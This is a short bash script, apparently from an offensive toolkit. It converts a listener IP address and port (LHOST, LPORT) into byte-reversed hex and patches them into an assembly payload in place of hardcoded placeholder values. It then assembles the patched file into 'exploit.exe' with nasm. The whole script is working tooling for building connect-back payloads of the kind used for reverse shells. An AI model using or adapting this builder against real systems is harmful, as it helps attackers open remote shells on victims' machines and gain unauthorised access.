#!/bin/bash

if [ "$#" -ne 3 ];then
  echo "Usage: $0 <ASMFILE> <LHOST> <LPORT>"
  exit
fi


LHOST="$2"
LPORT="$3"
ASMFILE="$1"

echo "Compiling $ASMFILE for $LHOST:$LPORT"

LHOSTHEX=$(python3 -c "print('0x'+''.join([ '%02x'%int(c) for c in '$LHOST'.split('.')][-1::-1]))")
LPORTHEX=$(python3 -c "s='%04x'%int('$LPORT');print('0x%s%s0002' %(s[2:],s[:2]))")

echo "$LPORTHEX $LHOSTHEX"

sed -e s/0x8877a8c0/$LHOSTHEX/ -e s/0x5c110002/$LPORTHEX/ "$ASMFILE" > exploit.asm
nasm -f bin -o exploit.exe exploit.asm
